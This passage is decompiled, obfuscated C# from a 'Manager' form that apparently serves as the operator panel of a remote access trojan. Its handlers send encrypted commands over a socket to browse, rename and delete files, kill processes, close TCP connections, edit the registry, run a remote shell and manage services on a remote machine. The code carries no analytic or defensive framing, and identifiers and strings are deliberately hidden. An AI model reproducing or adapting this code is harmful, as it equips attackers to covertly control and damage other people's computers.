			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items[0].Selected = true;
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829129126),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829139089)
			}));
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829129203),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829139089)
			}));
			this.Text = Conversions.ToString(global::\u000E\u2000.\u0002(this.sk.L));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Visible = false;
			try
			{
				this.\u000F\u200B = this.sk.Folder + global::\u0006\u2001.\u0002(-1829139017);
			}
			catch (Exception ex)
			{
			}
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = true;
		}

		// Token: 0x060002FC RID: 764 RVA: 0x0002148C File Offset: 0x0001F68C
		private void \u0003(object \u0002, EventArgs \u0003)
		{
			string text = string.Empty;
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + global::\u000E\u2000.\u000E + listViewItem.SubItems[1].Text;
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (text.Length > 0)
			{
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829129126),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829124417),
					text
				}));
			}
		}

		// Token: 0x060002FD RID: 765 RVA: 0x00021574 File Offset: 0x0001F774
		private void \u0005(object \u0002, EventArgs \u0003)
		{
			string text = string.Empty;
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						global::\u000E\u2000.\u000E,
						listViewItem.SubItems[1].Text,
						global::\u0006\u2001.\u0002(-1829124425),
						listViewItem.ToolTipText
					});
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (text.Length > 0)
			{
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829129126),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829124466),
					text
				}));
			}
		}

		// Token: 0x060002FE RID: 766 RVA: 0x00021684 File Offset: 0x0001F884
		private void \u0008(object \u0002, EventArgs \u0003)
		{
			string text = string.Empty;
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						global::\u000E\u2000.\u000E,
						listViewItem.SubItems[1].Text,
						global::\u0006\u2001.\u0002(-1829124425),
						listViewItem.ToolTipText,
						global::\u0006\u2001.\u0002(-1829124425),
						listViewItem.SubItems[4].Text
					});
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (text.Length > 0)
			{
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829129126),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829124475),
					text
				}));
			}
		}

		// Token: 0x060002FF RID: 767 RVA: 0x000217B4 File Offset: 0x0001F9B4
		private void \u0006(object \u0002, EventArgs \u0003)
		{
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = string.Empty;
		}

		// Token: 0x06000300 RID: 768 RVA: 0x000217C8 File Offset: 0x0001F9C8
		private void \u000E(object \u0002, EventArgs \u0003)
		{
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = false;
			if (this.sk == null)
			{
				this.Close();
				return;
			}
			if (!this.sk.CN)
			{
				this.Close();
				return;
			}
			try
			{
				switch (this.cur)
				{
				case Manager.CR.PR:
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Interval = 2000;
					if (this.PRNXT)
					{
						IEnumerator enumerator = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items.GetEnumerator();
						string text = string.Empty;
						while (enumerator.MoveNext())
						{
							object obj = enumerator.Current;
							ListViewItem listViewItem = (ListViewItem)obj;
							if (listViewItem != null)
							{
								text = text + global::\u000E\u2000.\u000E + listViewItem.SubItems[1].Text;
							}
						}
						this.sk.Send(string.Concat(new string[]
						{
							global::\u0006\u2001.\u0002(-1829128217),
							global::\u000E\u2000.\u000E,
							global::\u0006\u2001.\u0002(-1829129126),
							global::\u000E\u2000.\u000E,
							global::\u0006\u2001.\u0002(-1829124452),
							text
						}));
						this.PRNXT = false;
					}
					break;
				case Manager.CR.tcp:
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Interval = 2000;
					if (this.TCPNXT)
					{
						string text2 = string.Concat(new string[]
						{
							global::\u0006\u2001.\u0002(-1829128217),
							global::\u000E\u2000.\u000E,
							global::\u0006\u2001.\u0002(-1829128228),
							global::\u000E\u2000.\u000E,
							global::\u0006\u2001.\u0002(-1829139089),
							global::\u000E\u2000.\u000E
						});
						try
						{
							foreach (object obj2 in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Items)
							{
								ListViewItem listViewItem2 = (ListViewItem)obj2;
								text2 = text2 + listViewItem2.Tag.ToString() + global::\u000E\u2000.\u000E;
							}
						}
						finally
						{
							IEnumerator enumerator2;
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						this.sk.Send(text2);
						this.TCPNXT = false;
					}
					break;
				case Manager.CR.srv:
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Interval = 4000;
					if (this.srvNxt)
					{
						string s = string.Concat(new string[]
						{
							global::\u0006\u2001.\u0002(-1829128217),
							global::\u000E\u2000.\u000E,
							global::\u0006\u2001.\u0002(-1829128208),
							global::\u000E\u2000.\u000E,
							global::\u0006\u2001.\u0002(-1829139089)
						});
						this.sk.Send(s);
						this.srvNxt = false;
					}
					break;
				}
			}
			catch (Exception ex)
			{
			}
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = true;
		}

		// Token: 0x06000301 RID: 769 RVA: 0x00021ACC File Offset: 0x0001FCCC
		private void \u000F(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedItems.Count == 0)
			{
				return;
			}
			this.cur = (Manager.CR)this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedIndices[0];
			switch (this.cur)
			{
			case Manager.CR.fm:
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().BringToFront();
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().\u0005();
				break;
			case Manager.CR.PR:
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BringToFront();
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().\u0005();
				break;
			case Manager.CR.tcp:
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BringToFront();
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().\u0005();
				break;
			case Manager.CR.reg:
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BringToFront();
				break;
			case Manager.CR.shl:
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BringToFront();
				if (this.shStarted == 0)
				{
					this.shStarted = 1;
					this.sk.Send(string.Concat(new string[]
					{
						global::\u0006\u2001.\u0002(-1829128217),
						global::\u000E\u2000.\u000E,
						global::\u0006\u2001.\u0002(-1829128569),
						global::\u000E\u2000.\u000E,
						global::\u0006\u2001.\u0002(-1829139089)
					}));
				}
				break;
			case Manager.CR.srv:
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().BringToFront();
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().\u0005();
				break;
			}
			this.Icon = Icon.FromHandle(((Bitmap)this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Images[this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedItems[0].ImageIndex]).GetHicon());
		}

		// Token: 0x06000302 RID: 770 RVA: 0x00021C54 File Offset: 0x0001FE54
		private void \u0002\u2000(object \u0002, EventArgs \u0003)
		{
			string text = string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829128228),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829138798)
			});
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().SelectedItems.Count == 0)
			{
				return;
			}
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + global::\u000E\u2000.\u000E + listViewItem.Tag.ToString();
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.sk.Send(text);
		}

		// Token: 0x06000303 RID: 771 RVA: 0x00021D38 File Offset: 0x0001FF38
		private void \u0003\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode == null)
			{
				return;
			}
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = false;
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829128623),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829139089),
				global::\u000E\u2000.\u000E,
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath,
				global::\u0006\u2001.\u0002(-1829139395)
			}));
		}

		// Token: 0x06000304 RID: 772 RVA: 0x00021DE8 File Offset: 0x0001FFE8
		private void \u0005\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode == null)
			{
				return;
			}
			if (!this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath.Contains(global::\u0006\u2001.\u0002(-1829139395)))
			{
				return;
			}
			string text = Interaction.InputBox(global::\u0006\u2001.\u0002(-1829124460), global::\u0006\u2001.\u0002(-1829124380), global::\u0006\u2001.\u0002(-1829136393), -1, -1);
			if (text.Length == 0)
			{
				return;
			}
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = false;
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829128623),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829129212),
				global::\u000E\u2000.\u000E,
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath,
				global::\u0006\u2001.\u0002(-1829139395),
				global::\u000E\u2000.\u000E,
				text
			}));
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829128623),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829139089),
				global::\u000E\u2000.\u000E,
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath,
				global::\u0006\u2001.\u0002(-1829139395)
			}));
		}

		// Token: 0x06000305 RID: 773 RVA: 0x00021F74 File Offset: 0x00020174
		private void \u0008\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode == null)
			{
				return;
			}
			string fullPath = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath;
			if (!fullPath.Contains(global::\u0006\u2001.\u0002(-1829139395)))
			{
				return;
			}
			checked
			{
				string text = Strings.Split(fullPath, global::\u0006\u2001.\u0002(-1829139395), -1, CompareMethod.Binary)[Strings.Split(fullPath, global::\u0006\u2001.\u0002(-1829139395), -1, CompareMethod.Binary).Length - 1];
				string text2 = string.Empty;
				int num = 0;
				int num2 = Strings.Split(fullPath, global::\u0006\u2001.\u0002(-1829139395), -1, CompareMethod.Binary).Length - 2;
				for (int i = num; i <= num2; i++)
				{
					text2 = text2 + Strings.Split(fullPath, global::\u0006\u2001.\u0002(-1829139395), -1, CompareMethod.Binary)[i] + global::\u0006\u2001.\u0002(-1829139395);
				}
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = false;
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128623),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829129197),
					global::\u000E\u2000.\u000E,
					text2,
					global::\u000E\u2000.\u000E,
					text
				}));
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128623),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829139089),
					global::\u000E\u2000.\u000E,
					text,
					global::\u0006\u2001.\u0002(-1829139395)
				}));
			}
		}

		// Token: 0x06000306 RID: 774 RVA: 0x00022138 File Offset: 0x00020338
		private void \u0006\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode == null)
			{
				return;
			}
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = false;
			this.sk.Send(string.Concat(new string[]
			{
				global::\u0006\u2001.\u0002(-1829128217),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829128623),
				global::\u000E\u2000.\u000E,
				global::\u0006\u2001.\u0002(-1829139089),
				global::\u000E\u2000.\u000E,
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath,
				global::\u0006\u2001.\u0002(-1829139395)
			}));
		}

		// Token: 0x06000307 RID: 775 RVA: 0x000221E8 File Offset: 0x000203E8
		private void \u000E\u2000(object \u0002, EventArgs \u0003)
		{
			this.\u000F\u2000(RuntimeHelpers.GetObjectValue(\u0002), \u0003);
		}

		// Token: 0x06000308 RID: 776 RVA: 0x000221F8 File Offset: 0x000203F8
		private void \u000F\u2000(object \u0002, EventArgs \u0003)
		{
			if (this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().SelectedItems.Count == 0)
			{
				return;
			}
			ListViewItem listViewItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().SelectedItems[0];
			RGv rgv = new RGv();
			rgv.Path = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath + global::\u0006\u2001.\u0002(-1829139395);
			rgv.sk = this.sk;
			rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0002().Text = listViewItem.Text;
			rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0002().SelectedIndex = rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0002().Items.IndexOf(listViewItem.SubItems[1].Text);
			try
			{
				rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0003().Text = listViewItem.SubItems[2].Text;
			}
			catch (Exception ex)
			{
			}
			rgv.Text = rgv.Path;
			rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0002().ReadOnly = true;
			rgv.ShowDialog(this);
		}

		// Token: 0x06000309 RID: 777 RVA: 0x00022304 File Offset: 0x00020504
		private void \u0002\u2001(object \u0002, EventArgs \u0003)
		{
			RGv rgv = new RGv();
			rgv.Path = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath + global::\u0006\u2001.\u0002(-1829139395);
			rgv.sk = this.sk;
			rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829136393);
			rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0002().SelectedIndex = rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0002().Items.IndexOf(global::\u0006\u2001.\u0002(-1829128514));
			rgv.f6p9t8daym6c8amyuy6q97t72kjapfdk\u200A\u2009\u2000\u2005\u0003().Text = global::\u0006\u2001.\u0002(-1829124246);
			rgv.Text = rgv.Path;
			rgv.ShowDialog(this);
		}

		// Token: 0x0600030A RID: 778 RVA: 0x000223AC File Offset: 0x000205AC
		private void \u0003\u2001(object \u0002, EventArgs \u0003)
		{
			try
			{
				foreach (object obj in this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					this.sk.Send(string.Concat(new string[]
					{
						global::\u0006\u2001.\u0002(-1829128217),
						global::\u000E\u2000.\u000E,
						global::\u0006\u2001.\u0002(-1829128623),
						global::\u000E\u2000.\u000E,
						global::\u0006\u2001.\u0002(-1829138768),
						global::\u000E\u2000.\u000E,
						this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SelectedNode.FullPath,
						global::\u0006\u2001.\u0002(-1829139395),
						global::\u000E\u2000.\u000E,
						listViewItem.Text
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600030B RID: 779 RVA: 0x000224A0 File Offset: 0x000206A0
		private void \u0002(object \u0002, KeyEventArgs \u0003)
		{
			Keys keyCode = \u0003.KeyCode;
			checked
			{
				if (keyCode == Keys.Return)
				{
					string text = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text;
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = string.Empty;
					\u0003.SuppressKeyPress = true;
					this.\u0002\u2000\u2000[this.\u0005\u2000\u2000] = text;
					this.\u0005\u2000\u2000++;
					if (this.\u0005\u2000\u2000 > this.\u0002\u2000\u2000.Length - 1)
					{
						this.\u0005\u2000\u2000 = 0;
					}
					this.sk.Send(string.Concat(new string[]
					{
						global::\u0006\u2001.\u0002(-1829128217),
						global::\u000E\u2000.\u000E,
						global::\u0006\u2001.\u0002(-1829128569),
						global::\u000E\u2000.\u000E,
						global::\u0006\u2001.\u0002(-1829138798),
						global::\u000E\u2000.\u000E,
						global::\u000E.\u0002(ref text)
					}));
				}
				else if (keyCode == Keys.Down)
				{
					this.\u0003\u2000\u2000 += -1;
					if (this.\u0003\u2000\u2000 < 0)
					{
						this.\u0003\u2000\u2000 = 0;
					}
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = this.\u0002\u2000\u2000[this.\u0003\u2000\u2000];
				}
				else if (keyCode == Keys.Up)
				{
					this.\u0003\u2000\u2000++;
					if (this.\u0003\u2000\u2000 > this.\u0002\u2000\u2000.Length - 1)
					{
						this.\u0003\u2000\u2000 = this.\u0002\u2000\u2000.Length - 1;
					}
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = this.\u0002\u2000\u2000[this.\u0003\u2000\u2000];
				}
			}
		}

		// Token: 0x0600030C RID: 780 RVA: 0x00022618 File Offset: 0x00020818
		private void \u0005\u2001(object \u0002, EventArgs \u0003)
		{
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ScrollToCaret();
		}

		// Token: 0x0600030D RID: 781 RVA: 0x00022628 File Offset: 0x00020828
		private void \u0002(object \u0002, TreeViewEventArgs \u0003)
		{
			Manager.\u0002 u;
			if (this.RGCH.Contains(\u0003.Node.FullPath + global::\u0006\u2001.\u0002(-1829139395)))
			{
				u = (Manager.\u0002)this.RGCH[\u0003.Node.FullPath + global::\u0006\u2001.\u0002(-1829139395)];
			}
			if (u == null)
			{
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128623),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829139089),
					global::\u000E\u2000.\u000E,
					\u0003.Node.FullPath,
					global::\u0006\u2001.\u0002(-1829139395)
				}));
			}
			else if (u.\u0003.Count == 0 & u.\u0005.Count == 0)
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Clear();
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = false;
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128623),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829139089),
					global::\u000E\u2000.\u000E,
					\u0003.Node.FullPath,
					global::\u0006\u2001.\u0002(-1829139395)
				}));
			}
			else
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Clear();
				try
				{
					foreach (string[] array in u.\u0003)
					{
						ListViewItem listViewItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Add(array[0]);
						listViewItem.SubItems.Add(array[1]);
						listViewItem.SubItems.Add(array[2]);
						if (Operators.CompareString(array[1], global::\u0006\u2001.\u0002(-1829128514), false) == 0)
						{
							listViewItem.ImageIndex = 1;
						}
						else
						{
							listViewItem.ImageIndex = 2;
						}
					}
				}
				finally
				{
					List<string[]>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().\u0005();
			}
		}

		// Token: 0x0600030E RID: 782 RVA: 0x00022890 File Offset: 0x00020A90
		private void \u0003(object \u0002, TreeViewEventArgs \u0003)
		{
			Manager.\u0002 u;
			if (this.RGCH.Contains(\u0003.Node.FullPath + global::\u0006\u2001.\u0002(-1829139395)))
			{
				u = (Manager.\u0002)this.RGCH[\u0003.Node.FullPath + global::\u0006\u2001.\u0002(-1829139395)];
			}
			if (u == null)
			{
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128623),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829139089),
					global::\u000E\u2000.\u000E,
					\u0003.Node.FullPath,
					global::\u0006\u2001.\u0002(-1829139395)
				}));
			}
			else if (u.\u0003.Count == 0 & u.\u0005.Count == 0)
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Clear();
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = false;
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128623),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829139089),
					global::\u000E\u2000.\u000E,
					\u0003.Node.FullPath,
					global::\u0006\u2001.\u0002(-1829139395)
				}));
			}
			else
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Clear();
				try
				{
					foreach (string[] array in u.\u0003)
					{
						ListViewItem listViewItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Add(array[0]);
						listViewItem.SubItems.Add(array[1]);
						listViewItem.SubItems.Add(array[2]);
						if (Operators.CompareString(array[1], global::\u0006\u2001.\u0002(-1829128514), false) == 0)
						{
							listViewItem.ImageIndex = 1;
						}
						else
						{
							listViewItem.ImageIndex = 2;
						}
					}
				}
				finally
				{
					List<string[]>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().\u0005();
			}
		}

		// Token: 0x0600030F RID: 783 RVA: 0x00022AF8 File Offset: 0x00020CF8
		private void \u0005(object \u0002, TreeViewEventArgs \u0003)
		{
			Manager.\u0002 u;
			if (this.RGCH.Contains(\u0003.Node.FullPath + global::\u0006\u2001.\u0002(-1829139395)))
			{
				u = (Manager.\u0002)this.RGCH[\u0003.Node.FullPath + global::\u0006\u2001.\u0002(-1829139395)];
			}
			if (u == null)
			{
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128623),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829139089),
					global::\u000E\u2000.\u000E,
					\u0003.Node.FullPath,
					global::\u0006\u2001.\u0002(-1829139395)
				}));
			}
			else if (u.\u0003.Count == 0 & u.\u0005.Count == 0)
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Clear();
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Enabled = false;
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128623),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829139089),
					global::\u000E\u2000.\u000E,
					\u0003.Node.FullPath,
					global::\u0006\u2001.\u0002(-1829139395)
				}));
			}
			else
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().Items.Clear();
				try
				{
					foreach (string[] array in u.\u0003)
